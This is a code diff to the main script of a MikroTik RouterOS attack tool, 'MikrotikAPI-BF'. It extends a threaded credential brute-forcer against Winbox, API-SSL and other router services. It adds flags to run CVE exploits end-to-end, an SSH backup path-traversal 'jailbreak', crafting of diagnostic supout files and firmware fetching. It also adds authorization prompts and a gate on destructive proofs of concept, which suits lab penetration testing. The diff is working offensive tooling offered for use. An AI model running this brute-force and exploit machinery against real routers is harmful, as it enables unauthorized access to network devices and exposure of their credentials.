@@ -234,15 +234,14 @@ def _http_login(host: str, username: str, password: str, port: int = 80,
 
 
 def _winbox_login(host: str, username: str, password: str, port: int = 8291) -> Tuple[bool, str]:
-    """Attempt Winbox M2 protocol authentication.
+    """Attempt Winbox authentication (EC-SRP5 on ROS 6.43+/7.x, MD5 on older)."""
+    try:
+        from modules.winbox_auth import winbox_login as _wb
+        return _wb(host, username, password, port=port, timeout=10.0)
+    except ImportError:
+        pass
 
-    RouterOS 6.x uses MD5 challenge-response over M2 binary protocol.
-    RouterOS 7.x uses Curve25519/SRP — not yet implemented here.
-    This probe confirms port is open and auth is accepted.
-
-    Returns:
-        Tuple of (success, detail_string).
-    """
+    # Fallback: legacy MD5-only probe (ROS 6.x)
     try:
         import hashlib as _md5
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -299,11 +298,17 @@ def _winbox_login(host: str, username: str, password: str, port: int = 8291) -> 
 
 
 def _api_ssl_login(host: str, username: str, password: str, port: int = 8729) -> Tuple[bool, str]:
-    """Attempt RouterOS API-SSL (TLS over port 8729) authentication.
+    """Attempt RouterOS API-SSL (TLS over port 8729) authentication."""
+    try:
+        from core.apiros_client import ApiRosClient
+        client = ApiRosClient(host, port=port, user=username, password=password, use_ssl=True, timeout=5)
+        client.open_socket()
+        client.login()
+        client.close()
+        return True, "API-SSL login OK (ApiRosClient ADH)"
+    except Exception:
+        pass
 
-    Returns:
-        Tuple of (success, detail_string).
-    """
     try:
         import ssl as _ssl
         ctx = _ssl.create_default_context()
@@ -429,6 +434,20 @@ def _credential_matrix(
 
         if is_open:
             try:
+                if svc == "api-ssl":
+                    cert_hint = ""
+                    try:
+                        import requests as _rq
+                        svcs = _rq.get(
+                            f"http://{target}/rest/ip/service",
+                            auth=(username, password), timeout=4, verify=False,
+                        ).json()
+                        ssl_svc = next((s for s in svcs if s.get("name") == "api-ssl"), {})
+                        cert = ssl_svc.get("certificate", "none")
+                        if cert in ("none", "", None):
+                            cert_hint = " (certificate=none — TLS handshake will fail until a cert is bound)"
+                    except Exception:
+                        pass
                 if svc == "ftp":
                     success = _ftp_login(target, username, password, port)
                     detail = "FTP login OK" if success else "FTP credentials rejected"
@@ -454,6 +473,8 @@ def _credential_matrix(
                     success, detail = _winbox_login(target, username, password, port)
                 elif svc == "api-ssl":
                     success, detail = _api_ssl_login(target, username, password, port)
+                    if cert_hint and not success:
+                        detail += cert_hint
             except Exception as e:
                 detail = f"Error: {e}"
 
@@ -487,10 +508,10 @@ def _scan_services(target: str, api_port: int, http_port: int, ssl_port: int, us
     """Probe all standard MikroTik service ports in parallel."""
     import concurrent.futures as _cf
 
-    print("\n" + "═" * 60)
-    print("  TARGET SERVICE DISCOVERY")
-    print("═" * 60)
-    print(f"  Target: {target}")
+    from core.console import section, section_end, kv, port_state
+
+    section("TARGET SERVICE DISCOVERY")
+    kv("Target", target)
 
     probe_map: Dict[str, int] = {
         "api":     api_port,
@@ -507,12 +528,10 @@ def _scan_services(target: str, api_port: int, http_port: int, ssl_port: int, us
         results_fut = {svc: ex.submit(_port_open, target, port) for svc, port in probe_map.items()}
     services = {svc: fut.result() for svc, fut in results_fut.items()}
 
-    icons = {"open": "✓ OPEN", "closed": "✗ CLOSED"}
     for svc, port in probe_map.items():
         label = f"{svc.upper():<8} ({port:>5})"
-        state = icons["open"] if services[svc] else icons["closed"]
-        print(f"  {label}  : {state}")
-    print("═" * 60)
+        print(f"  {label}  : {port_state(services[svc])}")
+    section_end()
     return services
 
 
@@ -552,6 +571,7 @@ class BruteforceEngine:
         session_manager: Optional[SessionManager] = None,
         resume_session: bool = False,
         force_new_session: bool = False,
+        wordlist_order: str = "random",
     ) -> None:
         self.target = target
         self.api_port = api_port
@@ -587,6 +607,11 @@ class BruteforceEngine:
         self._idx_lock = threading.Lock()
         self._index = 0
         self._progress: Optional[ProgressBar] = None
+        self._quiet: Optional["QuietActivity"] = None
+        self._interrupted = False
+        self._completed = 0
+        self._completed_lock = threading.Lock()
+        self.wordlist_order = wordlist_order or "random"
 
         # Optional modules
         self.stealth_mgr = StealthManager(enabled=stealth_mode) if StealthManager else None
@@ -635,6 +660,8 @@ class BruteforceEngine:
                 return
 
         # Build wordlist from arguments
+        from core.wordlist_order import apply_wordlist_order, build_user_pass_combos, nest_for_order
+
         combos: List[Tuple[str, str]] = []
         if self._combo_dict:
             combos = self._load_combo_file(self._combo_dict)
@@ -645,17 +672,25 @@ class BruteforceEngine:
                 users = ["admin"]
             if pwds is None:
                 pwds = [""]
-            combos = [(u, p) for u in users for p in pwds]
+            combos = build_user_pass_combos(
+                users, pwds, nest=nest_for_order(self.wordlist_order)
+            )
         else:
             combos = [("admin", "")]
 
         # Deduplicate preserving order
         seen: set = set()
-        self.wordlist = []
+        deduped: List[Tuple[str, str]] = []
         for combo in combos:
             if combo not in seen:
                 seen.add(combo)
-                self.wordlist.append(combo)
+                deduped.append(combo)
+
+        try:
+            self.wordlist = apply_wordlist_order(deduped, self.wordlist_order)
+        except ValueError as exc:
+            print(f"[ERROR] {exc}")
+            sys.exit(1)
 
         # Create session
         if self.session_manager and not self.session_id:
@@ -709,12 +744,17 @@ class BruteforceEngine:
             return combo
 
     def _worker(self) -> None:
+        from core.escape import ShutdownCoordinator
+
         tid = threading.get_ident()
-        while True:
+        while not ShutdownCoordinator.stop_requested():
             combo = self._next_combo()
             if combo is None:
                 break
             user, pwd = combo
+
+            if ShutdownCoordinator.stop_requested():
+                break
 
             # Delay
             if self.stealth_mgr:
@@ -801,6 +841,11 @@ class BruteforceEngine:
                 if self._progress:
                     self._progress.update(1)
 
+            with self._completed_lock:
+                self._completed += 1
+            if self._quiet:
+                self._quiet.update(1)
+
             # ── Update session every 10 attempts ─────────────────────
             if self.session_manager and self.session_id and (self._index % 10 == 0 or found_services):
                 self.session_manager.update_session(
@@ -813,30 +858,32 @@ class BruteforceEngine:
 
     def run(self) -> List[Dict]:
         """Start the brute-force attack and return successful credentials."""
+        from core.console import section, section_end, kv, kv_onoff, ok, warn, err, highlight, dim
+        from core.escape import ShutdownCoordinator
+
         if not self.wordlist:
             self.log.info("[*] Nothing to test — wordlist is empty.")
             return []
 
-        # Attack configuration header
-        print("\n" + "═" * 60)
-        print("  ATTACK CONFIGURATION  v" + _VERSION)
-        print("═" * 60)
-        print(f"  Target          : {self.target}")
-        print(f"  API Port        : {self.api_port}")
-        print(f"  HTTP Port       : {self.http_port}")
-        print(f"  SSL             : {'ON' if self.use_ssl else 'OFF'}")
-        print(f"  Threads         : {self.max_workers}")
-        print(f"  Delay           : {self.delay}s")
-        print(f"  Total Combos    : {len(self.wordlist)}")
-        print(f"  Stealth Mode    : {'ON' if self.stealth_mode else 'OFF'}")
-        print(f"  Fingerprinting  : {'ON' if self.do_fingerprint else 'OFF'}")
+        section(f"ATTACK CONFIGURATION  v{_VERSION}")
+        kv("Target", self.target)
+        kv("API Port", self.api_port)
+        kv("HTTP Port", self.http_port)
+        kv_onoff("SSL", self.use_ssl)
+        kv("Threads", self.max_workers)
+        kv("Delay", f"{self.delay}s")
+        kv("Total Combos", len(self.wordlist))
+        kv("Wordlist Order", self.wordlist_order)
+        kv_onoff("Stealth Mode", self.stealth_mode)
+        kv_onoff("Fingerprinting", self.do_fingerprint)
         if self.proxy_mgr:
-            print(f"  Proxy           : {self.proxy_url}")
+            kv("Proxy", self.proxy_url)
         if self.validate_services:
-            print(f"  Validation      : {', '.join(self.validate_services).upper()}")
+            kv("Validation", ", ".join(self.validate_services).upper())
         if self.export_formats:
-            print(f"  Export          : {', '.join(self.export_formats).upper()}")
-        print("═" * 60 + "\n")
+            kv("Export", ", ".join(self.export_formats).upper())
+        section_end()
+        print()
 
         # Proxy setup
         if self.proxy_mgr:
@@ -855,58 +902,87 @@ class BruteforceEngine:
 
         self.log.info(f"[*] Testing {len(self.wordlist)} combination(s) with {self.max_workers} thread(s)…")
 
-        # Progress bar
         if self.show_progress:
             self._progress = ProgressBar(len(self.wordlist), show_eta=True, show_speed=True)
+        elif not self.verbose and not self.verbose_all:
+            from core.progress import QuietActivity
 
+            self._quiet = QuietActivity(len(self.wordlist), self.max_workers)
+            self._quiet.start()
+
+        ShutdownCoordinator.register(self)
         start = time.time()
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as pool:
+        pool = concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers)
+        futures: List[concurrent.futures.Future] = []
+        try:
             futures = [pool.submit(self._worker) for _ in range(self.max_workers)]
-            concurrent.futures.wait(futures)
+            while not all(f.done() for f in futures):
+                if ShutdownCoordinator.stop_requested():
+                    self._interrupted = True
+                    break
+                concurrent.futures.wait(
+                    futures,
+                    timeout=0.25,
+                    return_when=concurrent.futures.FIRST_COMPLETED,
+                )
+        except KeyboardInterrupt:
+            self._interrupted = True
+            ShutdownCoordinator.request_stop()
+        finally:
+            for fut in futures:
+                fut.cancel()
+            pool.shutdown(wait=False, cancel_futures=True)
+            ShutdownCoordinator.unregister(self)
 
         elapsed = time.time() - start
 
         if self._progress:
-            self._progress.finish()
+            if self._interrupted:
+                self._progress.interrupt()
+            else:
+                self._progress.finish()
 
-        # Restore proxy
+        if self._quiet:
+            self._quiet.stop()
+
         if self.proxy_mgr:
             self.proxy_mgr.restore_socket()
 
-        # Final session update
         if self.session_manager and self.session_id:
             self.session_manager.complete_session(self.session_id, self.successes)
 
-        # Statistics
+        tested = self._completed if self._interrupted else len(self.wordlist)
         total = len(self.wordlist)
         found = len(self.successes)
-        print("\n" + "═" * 60)
-        print("  ATTACK STATISTICS")
-        print("═" * 60)
-        print(f"  Total Tested    : {total}")
-        print(f"  Successful      : {found}")
-        print(f"  Failed          : {total - found}")
-        rate = found / total * 100 if total else 0
-        print(f"  Success Rate    : {rate:.1f}%")
-        print(f"  Elapsed         : {elapsed:.1f}s")
-        if total and elapsed:
-            print(f"  Speed           : {total/elapsed:.2f} att/s")
-        print("═" * 60)
 
-        # Results
+        section("ATTACK STATISTICS")
+        kv("Total Tested", tested if self._interrupted else total)
+        kv("Successful", found)
+        kv("Failed", tested - found if self._interrupted else total - found)
+        rate = found / tested * 100 if tested else 0
+        kv("Success Rate", f"{rate:.1f}%")
+        kv("Elapsed", f"{elapsed:.1f}s")
+        if tested and elapsed:
+            kv("Speed", f"{tested/elapsed:.2f} att/s")
+        section_end()
+
+        if self._interrupted:
+            print(f"\n  {warn('[!]')} Attack interrupted — tested {tested}/{total} combinations.")
+            print(f"  {dim('Tip')}: use {highlight('-y')} / {highlight('--yes-authorized')} to skip lab confirm; "
+                  f"{highlight('Ctrl+C')} twice to force exit.\n")
+
         if self.successes:
             deduped = list({(d["user"], d["pass"]): d for d in self.successes}.values())
-            print("\n" + "═" * 70)
-            print("  ✓  CREDENTIALS EXPOSED")
-            print("═" * 70)
+            print("\n" + ok("═" * 70))
+            print(f"  {ok('✓  CREDENTIALS EXPOSED')}")
+            print(ok("═" * 70))
             print(f"  {'#':<4}  {'USERNAME':<24}  {'PASSWORD':<24}  SERVICES")
             print("  " + "─" * 66)
             for i, d in enumerate(deduped, 1):
                 svcs = ", ".join(d["services"])
-                print(f"  {i:04}  {d['user']:<24}  {d['pass']:<24}  {svcs}")
-            print("═" * 70 + "\n")
+                print(f"  {highlight(f'{i:04}'):<4}  {highlight(d['user']):<24}  {warn(d['pass']):<24}  {svcs}")
+            print(ok("═" * 70) + "\n")
 
-            # Export
             if self.export_formats and ResultExporter:
                 exporter = ResultExporter(deduped, self.target, output_dir=self.export_dir)
                 for fmt in self.export_formats:
@@ -914,8 +990,8 @@ class BruteforceEngine:
                     if method:
                         path = method()
                         self.log.info(f"[EXPORT] {fmt.upper()} → {path}")
-        else:
-            print("\n  No credentials found.\n")
+        elif not self._interrupted:
+            print(f"\n  {err('No credentials found.')}\n")
 
         return self.successes
 
@@ -923,12 +999,17 @@ class BruteforceEngine:
 # ── Argument parser ────────────────────────────────────────────────────────
 
 def _build_parser() -> argparse.ArgumentParser:
+    from core.console import ColoredHelpFormatter
+
     p = argparse.ArgumentParser(
         prog="mikrotikapi-bf",
         description="MikrotikAPI-BF v" + _VERSION + " — RouterOS Attack & Exploitation Framework",
-        formatter_class=argparse.RawTextHelpFormatter,
+        formatter_class=ColoredHelpFormatter,
+        add_help=True,
         epilog=(
             "Examples:\n"
+            "  python mikrotikapi-bf.py                                    # launch menu\n"
+            "  python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p pass.lst -y\n"
             "  python mikrotikapi-bf.py -t 192.168.1.1 -U admin -P admin\n"
             "  python mikrotikapi-bf.py -t 192.168.1.1 -d wordlists/combos.lst --stealth\n"
             "  python mikrotikapi-bf.py -t 192.168.1.1 --exploit --fingerprint\n"
@@ -941,6 +1022,24 @@ def _build_parser() -> argparse.ArgumentParser:
     # Target
     p.add_argument("-t", "--target", metavar="IP", help="Target IP or hostname")
 
+    # Authorization & safety
+    safe = p.add_argument_group("Authorization & Safety")
+    safe.add_argument(
+        "--yes-authorized", "-y",
+        action="store_true",
+        help="Skip interactive authorization prompt (lab/automation only)",
+    )
+    safe.add_argument(
+        "--allow-default-creds",
+        action="store_true",
+        help="Allow fallback admin/empty password when no wordlist is given",
+    )
+    safe.add_argument(
+        "--menu",
+        action="store_true",
+        help="Show guided launch menu (also shown when run with no arguments)",
+    )
+
     # Credentials
     cred = p.add_argument_group("Credentials")
     cred.add_argument("-U", "--user",       default="admin",  help="Single username (default: admin)")
@@ -948,6 +1047,13 @@ def _build_parser() -> argparse.ArgumentParser:
     cred.add_argument("-u", "--userlist",   metavar="FILE",   help="Username wordlist file")
     cred.add_argument("-p", "--passlist",   metavar="FILE",   help="Password wordlist file")
     cred.add_argument("-d", "--dictionary", metavar="FILE",   help="Combo file (user:pass format)")
+    cred.add_argument(
+        "--wordlist-order", "--order",
+        dest="wordlist_order",
+        choices=("random", "forward", "reverse", "password-first"),
+        default="random",
+        help="Combo iteration: random (default), forward, reverse, password-first",
+    )
 
     # Timing
     timing = p.add_argument_group("Timing & Threads")
@@ -997,7 +1103,8 @@ def _build_parser() -> argparse.ArgumentParser:
     out = p.add_argument_group("Output")
     out.add_argument("-v",   "--verbose",     action="store_true", help="Show failed attempts")
     out.add_argument("-vv",  "--verbose-all", action="store_true", help="Full debug output")
-    out.add_argument("--progress",            action="store_true", help="Show progress bar with ETA")
+    out.add_argument("--progress",            action="store_true", help="Show progress bar (default when not using -v/-vv)")
+    out.add_argument("--no-progress",         action="store_true", help="Disable progress bar / quiet ticker")
 
     # Features
     feat = p.add_argument_group("Features")
@@ -1005,8 +1112,11 @@ def _build_parser() -> argparse.ArgumentParser:
     feat.add_argument("--fingerprint",  action="store_true", help="Run advanced device fingerprinting")
     feat.add_argument("--exploit",      action="store_true", help="Run exploit/CVE scanner after BF")
     feat.add_argument("--scan-cve",     action="store_true", help="Fingerprint target and run all applicable CVE PoCs")
+    feat.add_argument("--all-pocs", action="store_true",
+                      help="With --scan-cve: include generated version-check stubs (full PoC engine)")
     feat.add_argument("--all-cves",     action="store_true", help="Show ALL CVEs regardless of version (with --scan-cve)")
     feat.add_argument("--run-exploit",  metavar="CVE_ID",    help="Run a specific exploit check by ID (e.g. CVE-2018-14847)")
+    feat.add_argument("--e2e",          action="store_true", help="With --run-exploit: run exploit() after check() when available")
     feat.add_argument("--audit",        action="store_true", help="Run full 8-phase security audit via REST API")
     feat.add_argument("--audit-report", metavar="DIR", default="results", help="Output dir for audit report (default: results)")
     feat.add_argument("--timing-oracle", action="store_true", help="Run timing oracle test (length + char probe)")
@@ -1080,6 +1190,43 @@ def _build_parser() -> argparse.ArgumentParser:
         help="List sections in a RouterOS supout.rif diagnostic file.",
     )
     dec.add_argument(
+        "--extract-supout",
+        metavar="SUPOUT.RIF",
+        help="Extract all supout sections to ./supout_contents/ (decode_supout.py + /proc PR #16).",
+    )
+    dec.add_argument(
+        "--encode-supout",
+        metavar="FOLDER",
+        help="Build supout.rif from a folder of section files (encode_supout.py / issue #14).",
+    )
+    dec.add_argument(
+        "--encode-supout-out",
+        metavar="FILE",
+        default="crafted.supout.rif",
+        help="Output path for --encode-supout (default: crafted.supout.rif).",
+    )
+    dec.add_argument(
+        "--fetch-npk",
+        metavar="VERSION",
+        help="Download RouterOS NPK for VERSION from mirrors (getnpk.sh).",
+    )
+    dec.add_argument(
+        "--fetch-npk-dir",
+        metavar="DIR",
+        default=".tmp/npk",
+        help="Directory for --fetch-npk downloads.",
+    )
+    dec.add_argument(
+        "--unpack-npk",
+        metavar="PKG.NPK",
+        help="Unpack NPK via unnpk or internal parser (reversenpk.sh).",
+    )
+    dec.add_argument(
+        "--run-jailbreak",
+        action="store_true",
+        help="Run SSH backup jailbreak (MIKROTIK-JAILBREAK-001) — requires -t -U -P and lab auth.",
+    )
+    dec.add_argument(
         "--offline-analyze-dir",
         metavar="DIR",
         help="Analyze downloaded MikroTik artifacts directory (NPK/MIB/Winbox/Netinstall/Flashfig).",
@@ -1147,6 +1294,122 @@ def _build_parser() -> argparse.ArgumentParser:
 
 
 # ── Helpers ────────────────────────────────────────────────────────────────
+
+def _resolve_show_progress(args: argparse.Namespace) -> bool:
+    """Progress bar on by default unless -v/-vv or --no-progress."""
+    if getattr(args, "no_progress", False):
+        return False
+    if getattr(args, "progress", False):
+        return True
+    return not args.verbose and not args.verbose_all
+
+
+def _is_offline_mode(args: argparse.Namespace) -> bool:
+    """True when no live network target is required."""
+    return bool(
+        getattr(args, "decode_userdat", None)
+        or getattr(args, "decode_backup", None)
+        or getattr(args, "decode_supout", None)
+        or getattr(args, "extract_supout", None)
+        or getattr(args, "encode_supout", None)
+        or getattr(args, "fetch_npk", None)
+        or getattr(args, "unpack_npk", None)
+        or getattr(args, "analyze_npk", None)
+        or getattr(args, "offline_analyze_dir", None)
+        or getattr(args, "install_nse", False)
+        or getattr(args, "list_sessions", False)
+    )
+
+
+def _is_bruteforce_mode(args: argparse.Namespace) -> bool:
+    """True when credential brute-force will run."""
+    if _is_offline_mode(args) or getattr(args, "interactive", False):
+        return False
+    if getattr(args, "target_list", None):
+        return True
+    if not args.target:
+        return False
+    # Modes that only scan/exploit without BF still need target auth, not cred validation
+    if getattr(args, "scan_cve", False) and not getattr(args, "dictionary", None):
+        if not (getattr(args, "passlist", None) or getattr(args, "passw", None)):
+            return False
+    if getattr(args, "timing_oracle", False) or getattr(args, "cli_timing", False):
+        return False
+    if getattr(args, "privesc_test", False):
+        return False
+    if getattr(args, "run_exploit", None) and not getattr(args, "dictionary", None):
+        return False
+    if getattr(args, "audit", False):
+        return False
+    if getattr(args, "mac_discover", False) and not getattr(args, "mac_brute", False):
+        return False
+    return True
+
+
+def _apply_security_checks(args: argparse.Namespace, parser: argparse.ArgumentParser) -> None:
+    """Validate target, credentials, and authorization before network attacks."""
+    from core.security import (
+        confirm_authorization,
+        validate_attack_credentials,
+        validate_target_format,
+        warn_public_target,
+    )
+
+    targets: List[str] = []
+    if args.target:
+        targets.append(args.target)
+    if getattr(args, "target_list", None):
+        try:
+            with open(args.target_list, "r", encoding="utf-8", errors="replace") as fh:
+                targets.extend(ln.strip() for ln in fh if ln.strip() and not ln.startswith("#"))
+        except OSError as exc:
+            parser.error(f"Cannot read target list: {exc}")
+
+    if not targets or _is_offline_mode(args):
+        return
+
+    for t in targets:
+        try:
+            validate_target_format(t)
+        except ValueError as exc:
+            parser.error(str(exc))
+        warn_public_target(t)
+
+    if _is_bruteforce_mode(args):
+        try:
+            validate_attack_credentials(
+                user=getattr(args, "user", None),
+                passw=getattr(args, "passw", None),
+                userlist=getattr(args, "userlist", None),
+                passlist=getattr(args, "passlist", None),
+                dictionary=getattr(args, "dictionary", None),
+                allow_defaults=getattr(args, "allow_default_creds", False),
+            )
+        except ValueError as exc:
+            parser.error(str(exc))
+
+    primary = targets[0]
+    confirm_authorization(
+        primary,
+        skip=getattr(args, "yes_authorized", False),
+        stdin_is_tty=sys.stdin.isatty(),
+    )
+
+
+def _maybe_run_launch_menu() -> None:
+    """Inject argv from launch menu when no args or --menu."""
+    from core.interactive_menu import run_launch_menu
+
+    if len(sys.argv) > 1 and "--menu" not in sys.argv:
+        return
+    if len(sys.argv) > 1 and "--menu" in sys.argv:
+        sys.argv.remove("--menu")
+
+    extra = run_launch_menu()
+    if extra is None:
+        sys.exit(0)
+    sys.argv.extend(extra)
+
 
 def _parse_validate(raw: Optional[str]) -> Dict[str, Optional[int]]:
     if not raw:
@@ -1228,10 +1491,12 @@ def _run_cve_scan(
     export_formats = export_formats or []
     try:
         from xpl.cve_db import get_all_cves, get_cves_for_version
-        from xpl.exploits import EXPLOIT_REGISTRY
+        from xpl.poc_engine import full_registry
     except ImportError as e:
         print(f"[ERROR] Cannot import xpl module: {e}")
         return
+
+    EXPLOIT_REGISTRY = full_registry()
 
     SEP = "=" * 68
     SEP2 = "-" * 68
@@ -1553,7 +1818,7 @@ def _run_timing_oracle_mode(args: argparse.Namespace) -> int:
     attacker = TimingOracleAttacker(
         target=args.target,
         username=getattr(args, "user", "admin"),
-        timeout=float(getattr(args, "seconds", 2.0)),
+        timeout=float(getattr(args, "seconds", None) or 2.0),
     )
     result = attacker.run(
         samples=max(10, int(getattr(args, "timing_samples", 100))),
@@ -1583,7 +1848,7 @@ def _run_privesc_mode(args: argparse.Namespace) -> int:
 
     tester = PrivEscTester(
         target=args.target,
-        timeout=float(getattr(args, "seconds", 5.0)),
+        timeout=float(getattr(args, "seconds", None) or 5.0),
         http_port=int(getattr(args, "http_port", 80)),
     )
     result = tester.run(accounts=accounts)
@@ -1603,7 +1868,7 @@ def _run_cli_timing_mode(args: argparse.Namespace) -> int:
     oracle = CLITimingOracle(
         target=args.target,
         username=getattr(args, "user", "admin"),
-        timeout=float(getattr(args, "seconds", 3.0)),
+        timeout=float(getattr(args, "seconds", None) or 3.0),
     )
     result = oracle.run(
         password=getattr(args, "passw", "") or "",
@@ -1617,12 +1882,19 @@ def _run_cli_timing_mode(args: argparse.Namespace) -> int:
 # ── Entrypoint ────────────────────────────────────────────────────────────
 
 def main() -> None:
+    from core.escape import install_signal_handlers
+
+    install_signal_handlers()
+    _maybe_run_launch_menu()
     parser = _build_parser()
     args = parser.parse_args()
+    _show_progress = _resolve_show_progress(args)
 
     Log.banner(version=_VERSION)
 
     sm = SessionManager()
+
+    _apply_security_checks(args, parser)
 
     # ── Session management shortcuts ──────────────────────────────────
     if args.list_sessions:
@@ -1706,10 +1978,13 @@ def main() -> None:
             print(f"\n  [supout] Listing sections in: {_decode_supout}")
             sections = SupoutDecoder.list_sections(_decode_supout)
             if sections:
-                print(f"  {'Section name':45}  {'Size':10}  {'Offset'}")
-                print("  " + "-" * 70)
+                print(f"  {'#':>3}  {'Section name':40}  {'Size':>10}  proc?")
+                print("  " + "-" * 65)
                 for s in sections:
-                    print(f"  {s['name'][:45]:45}  {s['size']:10,}  {s['offset']}")
+                    idx = s.get("index", "")
+                    size = s.get("size", s.get("compressed_hint", 0))
+                    proc = "yes" if s.get("proc_archive") else "no"
+                    print(f"  {idx!s:>3}  {s['name'][:40]:40}  {size:>10,}  {proc}")
             else:
                 print("  No sections found — may not be a valid supout.rif")
             users = SupoutDecoder.extract_users_from_supout(_decode_supout)
@@ -1717,6 +1992,49 @@ def main() -> None:
                 print(f"\n  Users found in supout: {[u['username'] for u in users]}\n")
         except Exception as _se:
             print(f"\n  [supout] Error: {_se}\n")
+        sys.exit(0)
+
+    _extract_supout = getattr(args, "extract_supout", None)
+    if _extract_supout:
+        try:
+            from modules.decoder import SupoutDecoder
+            out_dir = _extract_supout + "_contents"
+            written = SupoutDecoder.extract_all(_extract_supout, out_dir)
+            print(f"\n  [supout] Extracted {len(written)} section(s) to {out_dir}\n")
+        except Exception as _se:
+            print(f"\n  [supout] Error: {_se}\n")
+        sys.exit(0)
+
+    _encode_supout = getattr(args, "encode_supout", None)
+    if _encode_supout:
+        try:
+            from modules.decoder import SupoutEncoder
+            out = getattr(args, "encode_supout_out", "crafted.supout.rif")
+            path = SupoutEncoder.build_from_folder(_encode_supout, out)
+            print(f"\n  [supout] Built {path} from {_encode_supout}\n")
+        except Exception as _se:
+            print(f"\n  [supout] Error: {_se}\n")
+        sys.exit(0)
+
+    _fetch_npk = getattr(args, "fetch_npk", None)
+    if _fetch_npk:
+        try:
+            from xpl.npk_tools import fetch_npk
+            dest = getattr(args, "fetch_npk_dir", ".tmp/npk")
+            r = fetch_npk(_fetch_npk, dest)
+            print(f"\n  [npk] {json.dumps(r, indent=2)}\n")
+        except Exception as _fe:
+            print(f"\n  [npk] Error: {_fe}\n")
+        sys.exit(0)
+
+    _unpack_npk = getattr(args, "unpack_npk", None)
+    if _unpack_npk:
+        try:
+            from xpl.npk_tools import unpack_npk
+            r = unpack_npk(_unpack_npk)
+            print(f"\n  [npk] {json.dumps(r, indent=2)}\n")
+        except Exception as _ue:
+            print(f"\n  [npk] Error: {_ue}\n")
         sys.exit(0)
 
     if _offline_dir:
@@ -1840,11 +2158,36 @@ def main() -> None:
         )
         sys.exit(0)
 
+    # ── SSH backup jailbreak (mikrotik-tools exploit-backup) ─────────
+    if getattr(args, "run_jailbreak", False) and args.target:
+        try:
+            from xpl.exploits import EXPLOIT_REGISTRY
+            cls = EXPLOIT_REGISTRY.get("MIKROTIK-JAILBREAK-001")
+            if not cls:
+                raise RuntimeError("MIKROTIK-JAILBREAK-001 not in registry")
+            exp = cls(
+                target=args.target,
+                username=getattr(args, "user", "") or "admin",
+                password=getattr(args, "passw", ""),
+                timeout=20,
+            )
+            print(f"\n  [JAILBREAK] Running backup path-traversal against {args.target}…")
+            if getattr(args, "e2e", False):
+                result = exp.exploit()
+            else:
+                result = exp.check()
+            print(f"  Success: {'YES' if result.get('vulnerable') or result.get('success') else 'NO'}")
+            print(f"  Detail:  {(result.get('evidence') or result.get('error', ''))[:300]}")
+        except Exception as exc:
+            print(f"\n  [JAILBREAK] Error: {exc}\n")
+        sys.exit(0)
+
     # ── Run specific exploit by ID (v3.9.0+) ────────────────────────
     _run_exploit_id = getattr(args, "run_exploit", None)
     if _run_exploit_id and args.target:
         try:
-            from xpl.exploits import EXPLOIT_REGISTRY
+            from xpl.poc_engine import full_registry
+            EXPLOIT_REGISTRY = full_registry()
             exploit_cls = EXPLOIT_REGISTRY.get(_run_exploit_id)
             if not exploit_cls:
                 print(f"\n  [ERROR] Exploit '{_run_exploit_id}' not found in registry.")
@@ -1864,6 +2207,30 @@ def main() -> None:
             print(f"  Evidence:   {result.get('evidence', 'N/A')[:200]}")
             if result.get("error"):
                 print(f"  Error:      {result['error']}")
+
+            if getattr(args, "e2e", False):
+                import os
+                from xpl.poc_engine import DESTRUCTIVE_IDS, has_exploit_method
+                if has_exploit_method(exploit_cls):
+                    lab_ok = os.environ.get("MIKROTIK_BF_YES_AUTHORIZED", "").strip().lower() in (
+                        "1", "true", "yes",
+                    )
+                    if _run_exploit_id in DESTRUCTIVE_IDS and not lab_ok:
+                        print("  E2E:        SKIPPED (destructive PoC — set MIKROTIK_BF_YES_AUTHORIZED=1)")
+                    elif vuln or _run_exploit_id in DESTRUCTIVE_IDS:
+                        exp_result = exploit.exploit()
+                        exp_vuln = exp_result.get("vulnerable", False)
+                        print(f"  Exploited:  {'YES' if exp_vuln else 'NO'}")
+                        print(f"  E2E proof:  {exp_result.get('evidence', 'N/A')[:200]}")
+                        if exp_result.get("error"):
+                            print(f"  E2E error:  {exp_result['error']}")
+                        result["exploit"] = exp_result
+                        result["exploited"] = exp_vuln
+                    else:
+                        print("  E2E:        SKIPPED (check returned not vulnerable)")
+                else:
+                    print("  E2E:        N/A (no exploit() method — check() is the PoC)")
+                    result["exploited"] = vuln
 
             _exp_fmts_xpl: List[str] = []
             if getattr(args, "export_all", False):
@@ -1977,13 +2344,14 @@ def main() -> None:
                 verbose_all=args.verbose_all,
                 validate_services=_parse_validate(args.validate),
                 services_ok=_svc,
-                show_progress=args.progress,
+                show_progress=_show_progress,
                 proxy_url=args.proxy,
                 export_formats=[],
                 export_dir=args.export_dir,
                 max_retries=args.max_retries,
                 stealth_mode=args.stealth,
                 fingerprint=args.fingerprint,
+                wordlist_order=getattr(args, "wordlist_order", "random"),
             )
             try:
                 _res = _eng.run()
@@ -2003,8 +2371,11 @@ def main() -> None:
         sys.exit(0)
 
     # ── Target required for all other modes ───────────────────────────
-    if not args.target:
-        parser.error("Target (-t) is required. Use --interactive for REPL mode.")
+    if not args.target and not getattr(args, "target_list", None):
+        parser.error(
+            "Target (-t) is required. "
+            "Use --interactive for REPL, or run without args for the launch menu."
+        )
 
     log = Log(verbose=args.verbose, verbose_all=args.verbose_all)
 
@@ -2081,7 +2452,7 @@ def main() -> None:
         verbose_all=args.verbose_all,
         validate_services=_parse_validate(args.validate),
         services_ok=services_ok,
-        show_progress=args.progress,
+        show_progress=_show_progress,
         proxy_url=args.proxy,
         export_formats=export_fmts,
         export_dir=args.export_dir,
@@ -2091,20 +2462,20 @@ def main() -> None:
         session_manager=sm,
         resume_session=args.resume,
         force_new_session=args.force,
+        wordlist_order=getattr(args, "wordlist_order", "random"),
     )
 
     try:
         results = engine.run()
-    except KeyboardInterrupt:
-        print(f"\n  [{_now()}] Attack interrupted. "
-              f"Tested {engine._index}/{len(engine.wordlist)} combinations.\n")
-        sys.exit(0)
     except Exception as exc:
         print(f"\n  [ERROR] {exc}")
         if args.verbose_all:
             import traceback
             traceback.print_exc()
         sys.exit(1)
+
+    if getattr(engine, "_interrupted", False):
+        sys.exit(130)
 
     # ── Exploit scanner ───────────────────────────────────────────────
     if args.exploit:
